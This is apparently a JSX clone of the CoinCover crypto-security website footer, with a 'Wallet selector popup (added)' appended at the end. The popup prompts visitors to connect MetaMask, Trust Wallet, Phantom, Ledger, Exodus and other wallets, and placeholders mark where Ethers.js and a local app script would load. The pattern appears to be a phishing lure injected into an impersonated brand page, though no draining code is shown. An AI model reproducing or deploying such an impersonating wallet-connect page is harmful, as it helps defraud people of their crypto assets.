                              d="M10.1784 20.9998V11.5544H7.17692V20.9998H10.1786H10.1784ZM21 20.9998V15.5832C21 12.6819 19.5194 11.3323 17.5448 11.3323C15.9526 11.3323 15.2394 12.2484 14.8401 12.8917V11.5544H11.8392C11.879 12.4408 11.8392 20.9998 11.8392 20.9998H14.8401V15.7248C14.8401 15.4425 14.8596 15.1602 14.939 14.9585C15.1556 14.3947 15.6498 13.8104 16.4788 13.8104C17.5643 13.8104 17.9991 14.677 17.9991 15.9462V21H21V20.9998ZM8.69795 7C7.67091 7 7 7.70624 7 8.63209C7 9.55793 7.65062 10.2642 8.65812 10.2642H8.67747C9.72403 10.2642 10.3756 9.53849 10.3756 8.63209C10.3563 7.70763 9.72593 7.00198 8.69795 7Z"
                              fill="white"
                            />
                          </svg>
                        </span>
                      </a>
                    </li>
                    <li>
                      <a
                        href="https://x.com/Coincoverglobal"
                        target="_blank"
                        rel="noopener"
                      >
                        <span className="social_icon custom_svg_icon">
                          <svg
                            width={28}
                            height={28}
                            viewBox="0 0 28 28"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path
                              d="M15.3318 12.9059L20.5436 6.84766H19.3086L14.7832 12.108L11.1688 6.84766H7L12.4657 14.8022L7 21.1552H8.23514L13.0141 15.6001L16.8312 21.1552H21L15.3318 12.9059ZM13.6401 14.8722L13.0863 14.0801L8.6801 7.77737H10.5771L14.1331 12.8639L14.6869 13.6559L19.3092 20.2676H17.4122L13.6401 14.8722Z"
                              fill="white"
                            />
                          </svg>
                        </span>
                      </a>
                    </li>
                    <li>
                      <a
                        href="https://www.youtube.com/@CoinCover3"
                        target="_blank"
                        rel="noopener"
                      >
                        <span className="social_icon custom_svg_icon">
                          <svg
                            width={28}
                            height={28}
                            viewBox="0 0 28 28"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path
                              d="M11.9682 16.9531V11.049L17.1584 14.0013L11.9682 16.9531ZM23.513 9.19031C23.2786 8.32876 22.6165 7.66266 21.775 7.42694L21.757 7.42297C19.6427 7.15414 17.1976 7.00053 14.716 7.00053C14.4636 7.00053 14.2122 7.00185 13.9612 7.00503L13.9996 7.0045C13.7864 7.00185 13.5353 7 13.2831 7C10.8015 7 8.3548 7.15361 5.9534 7.45104L6.24076 7.42191C5.38212 7.66213 4.71999 8.3277 4.4901 9.17177L4.48613 9.18899C4.22128 10.5855 4.07031 12.1924 4.07031 13.8345C4.07031 13.8927 4.07031 13.951 4.07111 14.0085V13.9992C4.07111 14.0482 4.07031 14.1065 4.07031 14.1647C4.07031 15.8068 4.22181 17.4131 4.51129 18.9712L4.48613 18.8097C4.72052 19.6712 5.38265 20.3371 6.22408 20.5731L6.24182 20.577C8.35586 20.8459 10.8012 20.9995 13.2829 20.9995C13.5345 20.9995 13.7861 20.9981 14.0377 20.995L13.9993 20.9955C14.2125 20.9981 14.4641 21 14.7157 21C17.1982 21 19.6441 20.8464 22.0455 20.5492L21.7581 20.5784C22.6175 20.3387 23.2797 19.6726 23.5101 18.8285L23.5141 18.8113C23.7784 17.415 23.9293 15.8079 23.9293 14.1666C23.9293 14.1083 23.9293 14.0501 23.9288 13.9923V14.0011C23.9288 13.9521 23.9293 13.8938 23.9293 13.8355C23.9293 12.1935 23.7776 10.5871 23.4884 9.02928L23.5135 9.19084H23.5127L23.513 9.19031Z"
                              fill="white"
                            />
                          </svg>
                        </span>
                      </a>
                    </li>
                    <li>
                      <a
                        href="https://bsky.app/profile/coincoverglobal.bsky.social"
                        target="_blank"
                        rel="noopener"
                      >
                        <span className="social_icon custom_svg_icon">
                          <svg
                            width={28}
                            height={29}
                            viewBox="0 0 28 29"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <g clipPath="url(#clip0_3659_61680)">
                              <path
                                d="M17.2113 15.9753L17.8782 16.1383C19.2048 16.4967 20.6949 17.4228 20.0562 19.0257C19.716 19.8793 18.5518 20.9514 17.6974 21.2787C15.8754 21.9768 14.8316 20.0962 14.2915 18.6889C14.2051 18.4636 14.1334 18.1591 14.0332 17.9539C14.0236 17.9341 14.016 17.9182 13.997 17.9052C13.9781 17.9182 13.9705 17.9341 13.9608 17.9539C13.8607 18.1591 13.789 18.4636 13.7025 18.6889C12.9723 20.5919 11.6699 22.4014 9.50723 20.8336C8.80486 20.3243 7.86391 19.3729 7.79044 18.4636C7.6822 17.1232 9.03321 16.4431 10.127 16.1353L10.7827 15.9753L10.1519 16.0325C8.3862 16.0902 6.7404 15.2725 6.42871 13.4116C6.33225 12.8358 6.28163 12.2096 6.22776 11.626C6.167 10.9667 6.11007 10.3003 6.07181 9.63937C6.01545 8.66456 6.02141 7.36181 7.35653 7.43244C9.04925 7.52195 10.9601 9.63276 11.9522 10.8826C12.7254 11.8567 13.423 12.8978 13.997 14.0025C14.519 12.9917 15.1504 12.0387 15.8433 11.138C16.8606 9.81533 18.7468 7.6691 20.4839 7.44905C22.2188 7.22929 21.9601 9.12708 21.8797 10.2495C21.8296 10.9486 21.7691 11.6526 21.6952 12.3496C21.6062 13.1895 21.5662 13.9345 21.0741 14.6516C20.2319 15.8787 18.6054 16.1707 17.2112 15.9754L17.2113 15.9753Z"
                                fill="white"
                              />
                            </g>
                            <defs>
                              <clipPath id="clip0_3659_61680">
                                <rect
                                  width="15.887"
                                  height={14}
                                  fill="white"
                                  transform="translate(6.05469 7.42969)"
                                />
                              </clipPath>
                            </defs>
                          </svg>
                        </span>
                      </a>
                    </li>
                    <li>
                      <a href="" target="_blank" rel="noopener">
                        <span className="social_icon custom_svg_icon">
                          <svg
                            width={28}
                            height={28}
                            viewBox="0 0 28 28"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <g clipPath="url(#clip0_3660_87098)">
                              <path
                                d="M25 10.3725V11.3168C22.877 9.92196 21.9613 12.6038 21.975 14.2846H25V14.8243L21.8348 14.8944C21.9558 16.6845 22.9004 18.7418 25 18.7364V20.8948C17.5214 22.2937 17.5008 9.23936 25 10.3725Z"
                                fill="white"
                              />
                              <path
                                d="M7.46875 7L11.5236 15.9034L15.4438 7H19.5C19.0999 7.42764 18.3175 7.51127 18.3918 8.27346L18.4041 19.7454C18.5018 20.254 18.9486 20.2985 19.3048 20.4793C19.4464 20.5521 19.5646 20.4051 19.5014 20.7612H14.2764V20.4928C14.7356 20.571 15.3764 20.026 15.3764 19.6146V9.02351L10.2875 20.625L9.81175 20.4874L4.925 9.29331V19.7481C4.925 19.8223 5.23713 20.2149 5.33888 20.2864C5.58638 20.459 5.96588 20.3902 6.02363 20.6236H3L3.90063 20.0935L4.22375 19.3313C4.056 15.9048 4.4905 12.2112 4.24162 8.81576C4.2155 8.46637 4.1825 7.87685 3.968 7.60031C3.7205 7.27655 3.1705 7.37502 3 7H7.46875Z"
                                fill="white"
                              />
                            </g>
                            <defs>
                              <clipPath id="clip0_3660_87098">
                                <rect
                                  width={22}
                                  height={14}
                                  fill="white"
                                  transform="translate(3 7)"
                                />
                              </clipPath>
                            </defs>
                          </svg>
                        </span>
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <div className="hs-footer-mid-section row">
            <div className="footer_mid_column footer_mid_left_column col-12 col-md-4 col-lg-4">
              <div className="footer_mid_content">
                <h4>
                  Digital assets.
                  <br />
                  Secured + protected.
                </h4>
              </div>
            </div>
            <div className="footer_mid_column footer_menu_column col-12 col-md-8 col-lg-8">
              <span
                id="hs_cos_wrapper_footer_menu"
                className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu"
                style={{}}
                data-hs-cos-general-type="widget"
                data-hs-cos-type="menu"
              >
                <div
                  id="hs_menu_wrapper_footer_menu"
                  className="hs-menu-wrapper active-branch no-flyouts hs-menu-flow-horizontal"
                  role="navigation"
                  data-sitemap-name="default"
                  data-menu-id={228994562257}
                  aria-label="Navigation Menu"
                >
                  <ul role="menu">
                    <li
                      className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                      role="none"
                    >
                      <a
                        href="javascript:;"
                        aria-haspopup="true"
                        aria-expanded="false"
                        role="menuitem"
                      >
                        For institutions
                      </a>
                      <ul role="menu" className="hs-menu-children-wrapper">
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Products
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="/products/recover-for-institutions"
                                role="menuitem"
                              >
                                CoinCover Recover for Institutions
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a href="/products/protect" role="menuitem">
                                CoinCover Protect
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/products/recover"
                                role="menuitem"
                              >
                                CoinCover Recover
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Solutions
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/solutions/exchanges"
                                role="menuitem"
                              >
                                Exchanges
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/solutions/financial-institutions"
                                role="menuitem"
                              >
                                Financial institutions
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/solutions/wallets"
                                role="menuitem"
                              >
                                Wallets
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Risks we protect against
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/risks/lost-wallet-access"
                                role="menuitem"
                              >
                                Lost wallet access
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/risks/crypto-fraud"
                                role="menuitem"
                              >
                                Crypto fraud
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                    <li
                      className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                      role="none"
                    >
                      <a
                        href="javascript:;"
                        aria-haspopup="true"
                        aria-expanded="false"
                        role="menuitem"
                      >
                        For people
                      </a>
                      <ul role="menu" className="hs-menu-children-wrapper">
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Products
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/consumers/products/recover"
                                role="menuitem"
                              >
                                What is CoinCover Recover?
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="/consumers/products/protect"
                                role="menuitem"
                              >
                                What is CoinCover Protect?
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Risks we protect against
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/consumers/risks/lost-access"
                                role="menuitem"
                              >
                                Lost wallet access
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/consumers/risks/crypto-fraud"
                                role="menuitem"
                              >
                                Crypto fraud
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                    <li
                      className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                      role="none"
                    >
                      <a
                        href="javascript:;"
                        aria-haspopup="true"
                        aria-expanded="false"
                        role="menuitem"
                      >
                        Knowledge Hub
                      </a>
                      <ul role="menu" className="hs-menu-children-wrapper">
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Resources
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/partners/partner-directory"
                                role="menuitem"
                              >
                                Partner directory
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://developer.coincover.com/"
                                role="menuitem"
                              >
                                Developer portal
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                                role="menuitem"
                              >
                                Trust Center
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/knowledge-hub/assets-we-protect"
                                role="menuitem"
                              >
                                Assets we protect
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/knowledge-hub/faqs"
                                role="menuitem"
                              >
                                Crypto FAQs
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/knowledge-hub/glossary"
                                role="menuitem"
                              >
                                Glossary
                              </a>
                            </li>
                          </ul>
                        </li>
                        <li
                          className="hs-menu-item hs-menu-depth-2 hs-item-has-children"
                          role="none"
                        >
                          <a href="javascript:;" role="menuitem">
                            Insights
                          </a>
                          <ul role="menu" className="hs-menu-children-wrapper">
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/blog"
                                role="menuitem"
                              >
                                Blog
                              </a>
                            </li>
                            <li
                              className="hs-menu-item hs-menu-depth-3"
                              role="none"
                            >
                              <a
                                href="https://www.coincover.com/knowledge-hub/reports/the-trust-factor"
                                role="menuitem"
                              >
                                The Trust Factor
                              </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                    <li
                      className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                      role="none"
                    >
                      <a
                        href="javascript:;"
                        aria-haspopup="true"
                        aria-expanded="false"
                        role="menuitem"
                      >
                        Company
                      </a>
                      <ul role="menu" className="hs-menu-children-wrapper">
                        <li
                          className="hs-menu-item hs-menu-depth-2"
                          role="none"
                        >
                          <a
                            href="https://www.coincover.com/about"
                            role="menuitem"
                          >
                            About us
                          </a>
                        </li>
                        <li
                          className="hs-menu-item hs-menu-depth-2"
                          role="none"
                        >
                          <a href="/contact" role="menuitem">
                            Contact us
                          </a>
                        </li>
                      </ul>
                    </li>
                  </ul>
                </div>
              </span>
            </div>
          </div>
          <div className="hs-footer-bottom-section row">
            <div className="footer_bottom_column bottom_left_coumn col-12 col-lg-9">
              <div className="footer_bottom_left_menu">
                <span
                  id="hs_cos_wrapper_footer_bottom_menu"
                  className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_menu"
                  style={{}}
                  data-hs-cos-general-type="widget"
                  data-hs-cos-type="menu"
                >
                  <div
                    id="hs_menu_wrapper_footer_bottom_menu"
                    className="hs-menu-wrapper active-branch no-flyouts hs-menu-flow-horizontal"
                    role="navigation"
                    data-sitemap-name="default"
                    data-menu-id={229001532644}
                    aria-label="Navigation Menu"
                  >
                    <ul role="menu">
                      <li className="hs-menu-item hs-menu-depth-1" role="none">
                        <a
                          href="https://www.coincover.com/terms-of-use"
                          role="menuitem"
                        >
                          Terms of use
                        </a>
                      </li>
                      <li className="hs-menu-item hs-menu-depth-1" role="none">
                        <a
                          href="https://www.coincover.com/privacy-policy"
                          role="menuitem"
                        >
                          Privacy policy
                        </a>
                      </li>
                      <li className="hs-menu-item hs-menu-depth-1" role="none">
                        <a
                          href="https://www.coincover.com/modern-slavery-statement"
                          role="menuitem"
                        >
                          Modern slavery statement
                        </a>
                      </li>
                      <li className="hs-menu-item hs-menu-depth-1" role="none">
                        <a
                          href="https://www.coincover.com/cookie-policy"
                          role="menuitem"
                        >
                          Cookie policy
                        </a>
                      </li>
                    </ul>
                  </div>
                </span>
              </div>
              <div className="footer_bottom_left_content text-size-small">
                <p>
                  CoinCover’s risk engine technology is insured so that if a
                  protected transaction turns out to be malicious, we are able
                  to compensate our customers. This is the CoinCover guarantee.
                  CoinCover itself does not provide insurance coverage for
                  assets or operations. Digital Asset Services Ltd (trading as
                  CoinCover) is incorporated in England and Wales with
                  registered number 11356137 whose registered office is at
                  Capital Building, Tyndall Street, Cardiff, Wales, CF10 4AZ.
                </p>
              </div>
            </div>
            <div className="footer_bottom_column bottom_right_coumn col-12 col-lg-3">
              <div className="footer_bottom_right_inner">
                <div
                  id="hs_cos_wrapper_module_footer_image_column"
                  className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                  style={{}}
                  data-hs-cos-general-type="widget"
                  data-hs-cos-type="module"
                >
                  <div className="hs_footerImageColumn row">
                    <div className="footer_image_column_item col-md-3 col-lg-3">
                      <div className="footer_image_column_next">
                        <a
                          href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                          target="_blank"
                          rel="noopener"
                        >
                          <img
                            src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/EGA-LIGN-SOC%20Badge%201.svg"
                            alt="A-LIGN SOC 2"
                            loading="lazy"
                          />
                        </a>
                      </div>
                    </div>
                    <div className="footer_image_column_item col-md-3 col-lg-3">
                      <div className="footer_image_column_next">
                        <a
                          href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                          target="_blank"
                          rel="noopener"
                        >
                          <img
                            src="https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=110&height=86&name=2White_Amtivo%20ISO%2027005.png"
                            alt="2White_Amtivo ISO 27005"
                            loading="lazy"
                            width={110}
                            height={86}
                            srcSet="https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=55&height=43&name=2White_Amtivo%20ISO%2027005.png 55w, https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=110&height=86&name=2White_Amtivo%20ISO%2027005.png 110w, https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=165&height=129&name=2White_Amtivo%20ISO%2027005.png 165w, https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=220&height=172&name=2White_Amtivo%20ISO%2027005.png 220w, https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=275&height=215&name=2White_Amtivo%20ISO%2027005.png 275w, https://www.coincover.com/hs-fs/hubfs/2White_Amtivo%20ISO%2027005.png?width=330&height=258&name=2White_Amtivo%20ISO%2027005.png 330w"
                            sizes="(max-width: 110px) 100vw, 110px"
                          />
                        </a>
                      </div>
                    </div>
                    <div className="footer_image_column_item col-md-3 col-lg-3">
                      <div className="footer_image_column_next">
                        <a
                          href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                          target="_blank"
                          rel="noopener"
                        >
                          <img
                            src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/EGA-LIGN-SOC%20Badge%201-1.svg"
                            alt="CYBER ESSENTIALS CERTIFIED"
                            loading="lazy"
                          />
                        </a>
                      </div>
                    </div>
                    <div className="footer_image_column_item col-md-3 col-lg-3">
                      <div className="footer_image_column_next">
                        <a
                          href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                          target="_blank"
                          rel="noopener"
                        >
                          <img
                            src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/EGA-LIGN-SOC%20Badge%201-2.svg"
                            alt="CYBER ESSENTIALS CERTIFIED PLUS"
                            loading="lazy"
                          />
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="footer_copyright_section text-size-small">
            <div
              id="hs_cos_wrapper_footer_copyright_text"
              className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-text"
              style={{}}
              data-hs-cos-general-type="widget"
              data-hs-cos-type="module"
            >
              <span
                id="hs_cos_wrapper_footer_copyright_text_"
                className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_text"
                style={{}}
                data-hs-cos-general-type="widget"
                data-hs-cos-type="text"
              >
                © 2025 CoinCover
              </span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  {/* JS Dependencies */}
  {/* GSAP and ScrollTrigger */}
  {/* HubSpot performance collection script */}
  {/* Start of HubSpot Analytics Code */}
  {/* End of HubSpot Analytics Code */}
  {/* Google Tag Manager (noscript) */}
  <noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NKFBCSB"
    height="0" width="0"
    style={{display: "none", visibility: "hidden"}}></iframe>
  </noscript>
  {/* End Google Tag Manager (noscript) */}
  {/* Google tag (gtag.js) */}
  {/* Google Tag Manager (noscript) */}
  <noscript>
    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WT5MKR7H"
    height="0" width="0"
    style={{display: "none", visibility: "hidden"}}></iframe>
  </noscript>
  {/* End Google Tag Manager (noscript) */}
  {/* Wallet selector popup (added) */}
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n  #wallet-selector-popup{display:none;position:fixed;inset:0;z-index:9999;font-family:inherit}\n  #wallet-selector-popup.show{display:block}\n  #wallet-selector-popup .wallet-popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.6)}\n  #wallet-selector-popup .wallet-popup-content{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:#fff;border-radius:12px;padding:20px;max-width:360px;width:90%;z-index:10000;text-align:center;color:#0f172a}\n  #wallet-selector-popup .wallet-option{display:block;width:100%;margin:8px 0;padding:12px;border-radius:8px;border:1px solid #e5e7eb;background:#111827;color:#fff;font-weight:600}\n  #wallet-selector-popup .wallet-option.trust{background:#0ea5a2}\n  #wallet-selector-popup .wallet-option.walletconnect{background:#3b82f6}\n  #wallet-selector-popup .close-btn{position:absolute;top:8px;right:12px;border:none;background:none;font-size:22px}\n\n  /* Mobile spacing fix for header dropdowns to avoid overlap (adds space between options) */\n  @media (max-width: 640px) {\n    .hs-menu-wrapper .hs-menu-children-wrapper li.hs-menu-item.hs-menu-depth-2 { margin-bottom: 12px; padding-bottom: 6px; }\n    .hs-menu-wrapper .hs-menu-children-wrapper { gap: 8px; }\n  }\n"
    }}
  />
  <div id="wallet-selector-popup" className="wallet-popup" aria-hidden="true">
    <div className="wallet-popup-overlay" />
    <div
      className="wallet-popup-content"
      role="dialog"
      aria-modal="true"
      aria-labelledby="wallet-popup-title"
    >
      <button id="wallet-popup-close" className="close-btn" aria-label="Close">
        ×
      </button>
      <h3 id="wallet-popup-title" style={{ marginTop: 4, marginBottom: 8 }}>
        Connect Wallet
      </h3>
      <p style={{ color: "#475569", marginBottom: 14 }}>
        Choose a wallet to connect
      </p>
      <div className="wallet-buttons">
        <button id="wallet-btn-metamask" className="wallet-option metamask">
          MetaMask
        </button>
        <button id="wallet-btn-trust" className="wallet-option trust">
          Trust Wallet
        </button>
        <button
          id="wallet-btn-walletconnect"
          className="wallet-option walletconnect"
        >
          WalletConnect
        </button>
        <button id="wallet-btn-phantom" className="wallet-option">
          Phantom (Solana)
        </button>
        <button id="wallet-btn-ledger" className="wallet-option">
          Ledger
        </button>
        <button id="wallet-btn-exodus" className="wallet-option">
          Exodus
        </button>
        <button className="wallet-option" onClick={() => {}}>
          Cancel
        </button>
      </div>
    </div>
  </div>
  {/* Ethers.js (UMD build) */}
  {/* Local app script */}
  <div id="walletInfo" className="hidden mt-8"></div>
</>
  );
}
